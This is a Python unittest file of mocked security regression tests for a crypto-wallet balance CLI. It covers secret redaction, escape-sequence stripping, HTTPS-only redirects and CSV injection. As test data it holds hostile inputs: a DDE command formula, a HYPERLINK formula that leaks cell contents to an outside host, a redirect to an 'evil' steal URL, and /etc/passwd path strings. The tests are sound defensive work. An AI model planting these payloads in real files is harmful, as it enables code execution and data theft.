"""Security regression tests (offline: requests.request is mocked)."""
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "core"))

import requests

import main as cli
import pricing
from providers import net, safe
from providers.base import TokenBalance, WalletBalance
from providers.ethereum import EthereumProvider
from providers.multiversx import MultiversXProvider
from providers.solana import SolanaProvider

net.THROTTLE_ENABLED = False   # tests must not sleep
net.RETRY_DELAYS = ()

ETH = "0x" + "ab" * 20
MVX = "erd1" + "q" * 58
SOL = "1" * 32


class FakeResp:
    def __init__(self, payload=None, status=200, url="https://x.test/", body=None, history=(), headers=None):
        self.headers = headers or {}
        self.status_code = status
        self.url = url
        self.history = list(history)
        self._body = body if body is not None else json.dumps(payload).encode()

    def raise_for_status(self):
        if self.status_code >= 400:
            raise requests.HTTPError(f"{self.status_code} Error for url: {self.url}")

    def iter_content(self, chunk_size=1):
        for i in range(0, len(self._body), chunk_size):
            yield self._body[i : i + chunk_size]

    def close(self):
        pass


def router(routes):
    def fake(method, url, **kw):
        for key, val in routes.items():
            if key in url:
                return val(url, kw) if callable(val) else val
        raise requests.ConnectionError(f"no route {url}")
    return fake


class SafeTests(unittest.TestCase):
    def test_clean_text_strips_escape_and_bidi(self):
        t = safe.clean_text("a\x1b[31mred‮bad​\nline")
        self.assertNotIn("\x1b", t)
        self.assertNotIn("‮", t)
        self.assertNotIn("\n", t)

    def test_clean_text_truncates(self):
        self.assertLessEqual(len(safe.clean_text("x" * 10_000, 50)), 50)

    def test_redact_query_key_and_env(self):
        with mock.patch.dict(os.environ, {"ETH_RPC_URL": "https://rpc.test/v2/SECRETKEY123"}):
            s = safe.redact("fail https://rpc.test/v2/SECRETKEY123 and https://a/b?apikey=ABCDEF&x=1")
        self.assertNotIn("SECRETKEY123", s)
        self.assertNotIn("ABCDEF", s)
        self.assertNotIn("user:pw@", safe.redact("https://user:pw@h.test/x"))
        self.assertNotIn("TOKONLY", safe.redact("https://TOKONLY@h.test/x"))
        with mock.patch.dict(os.environ, {"ETH_RPC_URL": "https://rpc.test/v2/PATHSECRET99?x=QSECRET77"}):
            r = safe.redact("HTTPSConnectionPool: url: /v2/PATHSECRET99?x=QSECRET77")
        self.assertNotIn("PATHSECRET99", r)
        self.assertNotIn("QSECRET77", r)

    def test_csv_text(self):
        for bad in ("=1+1", "+1", "-1", "@SUM(A1)", "\tx"):
            self.assertTrue(safe.csv_text(bad).startswith("'"))
        self.assertEqual(safe.csv_text("ok"), "ok")

    def test_numbers(self):
        for bad in (float("nan"), float("inf"), -1, 1e30, "abc", None):
            self.assertIsNone(safe.safe_amount(bad))
        self.assertIsNone(safe.safe_decimals(10**9))
        self.assertIsNone(safe.safe_decimals(-1))
        self.assertEqual(safe.safe_decimals("18"), 18)

    def test_rpc_url(self):
        self.assertIsNone(safe.validate_rpc_url("http://evil.test"))
        self.assertIsNone(safe.validate_rpc_url("file:///etc/passwd"))
        self.assertIsNotNone(safe.validate_rpc_url("https://ok.test/key"))
        self.assertIsNotNone(safe.validate_rpc_url("http://127.0.0.1:8545"))

    def test_sanitize_wallet(self):
        w = WalletBalance("ethereum", ETH, "ETH", native_amount=1.0,
                          tokens=[TokenBalance("A\x1b[2J", "n", float("nan")),
                                  TokenBalance("B‮", "n", 5.0)])
        safe.sanitize_wallet(w)
        self.assertEqual(len(w.tokens), 1)
        self.assertNotIn("‮", w.tokens[0].symbol)
        self.assertIn("ignorée", w.warning)


class NetTests(unittest.TestCase):
    def test_error_has_no_key(self):
        def boom(*a, **k):
            raise requests.ConnectionError("fail https://api.etherscan.io/api?apikey=TOPSECRET1")
        with mock.patch("requests.request", boom):
            with self.assertRaises(net.HttpError) as cm:
                net.request_json("GET", "https://api.etherscan.io/api")
        self.assertNotIn("TOPSECRET1", str(cm.exception))

    def test_http_refused(self):
        with self.assertRaises(net.HttpError):
            net.request_json("GET", "http://example.test/")

    def test_redirect_to_http_refused_before_second_request(self):
        calls = []
        def fake(method, url, **kw):
            calls.append(url)
            assert kw.get("allow_redirects") is False
            return FakeResp(status=302, headers={"Location": "http://evil.test/steal"})
        with mock.patch("requests.request", fake):
            with self.assertRaises(net.HttpError):
                net.request_json("GET", "https://ok.test/?apikey=K")
        self.assertEqual(calls, ["https://ok.test/?apikey=K"])  # evil.test never contacted

    def test_https_redirect_followed_and_loop_bounded(self):
        seq = iter([FakeResp(status=301, headers={"Location": "/b"}), FakeResp({"ok": 1})])
        with mock.patch("requests.request", lambda *a, **k: next(seq)):
            self.assertEqual(net.request_json("GET", "https://ok.test/a"), {"ok": 1})
        loop = lambda *a, **k: FakeResp(status=302, headers={"Location": "/again"})
        with mock.patch("requests.request", loop):
            with self.assertRaises(net.HttpError):
                net.request_json("GET", "https://ok.test/a")

    def test_size_cap(self):
        resp = FakeResp(body=b"[" + b"1," * 600_000 + b"1]")
        with mock.patch("requests.request", lambda *a, **k: resp):
            with self.assertRaises(net.HttpError):
                net.request_json("GET", "https://ok.test/", max_bytes=1_000_000)

    def test_bad_json(self):
        with mock.patch("requests.request", lambda *a, **k: FakeResp(body=b"<html>")):
            with self.assertRaises(net.HttpError):
                net.request_json("GET", "https://ok.test/")

    def test_retry_on_429_then_ok(self):
        seq = iter([FakeResp(status=429, headers={"Retry-After": "0"}), FakeResp({"ok": 1})])
        with mock.patch.object(net, "RETRY_DELAYS", (0.0, 0.0)), \
             mock.patch.object(net, "_sleep", lambda s: None), \
             mock.patch("requests.request", lambda *a, **k: next(seq)):
            self.assertEqual(net.request_json("GET", "https://ok.test/"), {"ok": 1})

    def test_retry_gives_up_with_short_error(self):
        always = lambda *a, **k: FakeResp(status=429, url="https://api.x.test/accounts/erd1abc")
        with mock.patch.object(net, "RETRY_DELAYS", (0.0, 0.0)), \
             mock.patch.object(net, "_sleep", lambda s: None), \
             mock.patch("requests.request", always):
            with self.assertRaises(net.HttpError) as cm:
                net.request_json("GET", "https://api.x.test/accounts/erd1abc")
        self.assertEqual(str(cm.exception), "HTTP 429 from api.x.test")

    def test_http_error_redacted(self):
        resp = FakeResp(status=500, url="https://a.test/?apikey=LEAKME99")
        with mock.patch("requests.request", lambda *a, **k: resp):
            with self.assertRaises(net.HttpError) as cm:
                net.request_json("GET", "https://a.test/")
        self.assertNotIn("LEAKME99", str(cm.exception))


class ProviderTests(unittest.TestCase):
    def test_eth_key_not_leaked_and_hostile_decimals(self):
        tx = {"contractAddress": "0x" + "cd" * 20, "tokenDecimal": "999999999",
              "tokenSymbol": "EVIL\x1b[31m", "tokenName": "n" * 5000}
        tx2 = {"contractAddress": "not-an-address", "tokenDecimal": "18"}
        routes = {
            "etherscan": FakeResp({"status": "1", "result": [tx, tx2]}),
            "beaconcha": FakeResp({"data": []}),
            "llamarpc": lambda u, k: FakeResp({"result": hex(10**18) if k["json"]["method"] == "eth_getBalance" else "0x" + "f" * 64}),
        }
        with mock.patch.dict(os.environ, {"ETHERSCAN_API_KEY": "KEY12345"}), \
             mock.patch("requests.request", router(routes)):
            w = EthereumProvider().get_balance(ETH)
        cli.sanitize_wallet(w)
        self.assertEqual(w.native_amount, 1.0)
        for t in w.tokens:
            self.assertNotIn("\x1b", t.symbol)
            self.assertLessEqual(len(t.name), 300)

    def test_eth_etherscan_error_surfaced_without_key(self):
        routes = {
            "etherscan": FakeResp({"status": "0", "message": "NOTOK", "result": "Invalid API Key"}),
            "beaconcha": FakeResp({"data": []}),
            "llamarpc": FakeResp({"result": "0x0"}),
        }
        with mock.patch.dict(os.environ, {"ETHERSCAN_API_KEY": "KEY12345"}), \
             mock.patch("requests.request", router(routes)):
            w = EthereumProvider().get_balance(ETH)
        self.assertIn("Etherscan", w.warning)
        self.assertNotIn("KEY12345", w.warning)

    def test_eth_rpc_error_no_key(self):
        def boom(*a, **k):
            raise requests.ConnectionError("x https://rpc.test/v2/PATHSECRET")
        with mock.patch.dict(os.environ, {"ETH_RPC_URL": "https://rpc.test/v2/PATHSECRET"}), \
             mock.patch("requests.request", boom):
            w = EthereumProvider().get_balance(ETH)
        self.assertTrue(w.error)
        self.assertNotIn("PATHSECRET", w.error)

    def test_mvx_pagination_loop_bounded_and_decimals(self):
        calls = {"n": 0}
        page = [{"identifier": f"T-{i:06x}", "ticker": "T", "name": "n", "decimals": 2, "balance": "100"} for i in range(100)]
        def tokens(url, kw):
            calls["n"] += 1
            return FakeResp(page)
        routes = {
            "/tokens": tokens,
            "/nfts": FakeResp([]),
            "/delegation-legacy": FakeResp({}),
            "/delegation": FakeResp([]),
            "/stake": FakeResp({}),
            "/accounts/" + MVX: FakeResp({"balance": "10" * 20}),
        }
        # most specific first: order dict so '/accounts/<addr>' (exact end) is last resort
        r = router({k: v for k, v in routes.items() if k != "/accounts/" + MVX} | {MVX: routes["/accounts/" + MVX]})
        def fake(method, url, **kw):
            if url.endswith(MVX):
                return routes["/accounts/" + MVX]
            return r(method, url, **kw)
        with mock.patch("requests.request", fake):
            w = MultiversXProvider().get_balance(MVX)
        self.assertLessEqual(calls["n"], 20)
        self.assertLessEqual(len(w.tokens), 2000)

    def test_mvx_hostile_decimals_ignored(self):
        p = MultiversXProvider()
        self.assertIsNone(p._to_token_balance({"decimals": 10**9, "balance": "5"}))
        self.assertIsNone(p._to_token_balance({"decimals": 2, "balance": "x"}))

    def test_solana_rpc_error_warning_and_markup(self):
        def rpc(url, kw):
            m = kw["json"]["method"]
            if m == "getBalance":
                return FakeResp({"result": {"value": 10**9}})
            if m == "getTokenAccountsByOwner":
                return FakeResp({"error": {"message": "rate limited https://h/?api-key=SOLKEY1"}})
            return FakeResp({"result": []})
        with mock.patch("requests.request", router({"solana.com": rpc})):
            w = SolanaProvider().get_balance(SOL)
        self.assertEqual(w.native_amount, 1.0)
        self.assertIn("SPL", w.warning)
        self.assertNotIn("SOLKEY1", w.warning)


class PricingTests(unittest.TestCase):
    def setUp(self):
        pricing.clear_cache()

    def test_hostile_prices(self):
        routes = {"simple/price": FakeResp({"ethereum": {"usd": "NaN", "eur": 1e30}})}
        with mock.patch("requests.request", router(routes)):
            p = pricing._fetch_native_prices({"ethereum"})
        self.assertEqual(p["ethereum"], {})

    def test_position_cap(self):
        w = WalletBalance("ethereum", ETH, "ETH", native_amount=1.0)
        w.tokens.append(TokenBalance("X", "x", 1e20, contract="0x" + "cd" * 20))
        routes = {
            "simple/price": FakeResp({"ethereum": {"usd": 2000, "eur": 1800}}),
            "token_price": FakeResp({("0x" + "cd" * 20): {"usd": 1e11, "eur": 1e11}}),
        }
        with mock.patch("requests.request", router(routes)):
            pricing.apply_pricing([w])
        self.assertIsNone(w.tokens[0].usd_value)
        self.assertEqual(w.total_usd, 2000)

    def test_pricing_outage_reports_false(self):
        w = WalletBalance("ethereum", ETH, "ETH", native_amount=1.0)
        def boom(*a, **k):
            raise requests.ConnectionError("down")
        with mock.patch("requests.request", boom):
            self.assertFalse(pricing.apply_pricing([w]))
        self.assertIsNone(w.total_usd)

    def test_solana_mint_case_preserved(self):
        mint = "So11111111111111111111111111111111111111112"
        routes = {"token_price": FakeResp({mint: {"usd": 150, "eur": 140}})}
        with mock.patch("requests.request", router(routes)):
            p = pricing._fetch_token_prices("solana", {mint})
        self.assertIn(mint, p)

    def test_fx_sanity(self):
        with mock.patch("requests.request", router({"latest": FakeResp({"rates": {"EUR": 500}})})):
            self.assertIsNone(pricing._fetch_usd_eur_rate())


class CliTests(unittest.TestCase):
    def test_forced_chain_bad_address(self):
        w = cli.resolve_wallet("L", "ethereum", "../../etc/passwd?x=1")
        self.assertIn("Invalid", w.error)

    def test_entries_cap_and_line_cap(self):
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "a.txt"
            p.write_text("\n".join([ETH] * (safe.MAX_ENTRIES + 1)))
            with self.assertRaises(ValueError):
                cli.parse_input_file(p)
            p.write_text("[" + "L" * 5000 + "]\n" + "x" * 5000)
            e = cli.parse_input_file(p)
            self.assertLessEqual(len(e[0][2]), safe.MAX_LINE)

    def test_workers_bounded(self):
        with mock.patch.object(cli, "resolve_wallet", lambda l, c, a: WalletBalance("x", a, "?")):
            self.assertEqual(len(cli.fetch_all([(None, None, "a")] * 3, workers=10**6)), 3)
            self.assertEqual(len(cli.fetch_all([(None, None, "a")], workers=-5)), 1)

    def test_csv_injection_and_perms(self):
        w = WalletBalance("ethereum", ETH, "ETH", native_amount=1.0, label="=cmd|' /C calc'!A0")
        w.tokens.append(TokenBalance('=HYPERLINK("http://e/?"&A1)', "-evil", 1.0))
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "o.csv"
            cli.write_csv([w], p)
            txt = p.read_text()
            for line in txt.splitlines()[1:]:
                for cell in line.split(","):
                    self.assertFalse(cell.startswith(("=", "@")), cell)
            self.assertEqual(oct(p.stat().st_mode & 0o777), "0o600")
            cli.write_json([w], Path(d) / "o.json")
            self.assertEqual(oct((Path(d) / "o.json").stat().st_mode & 0o777), "0o600")


if __name__ == "__main__":
    unittest.main()
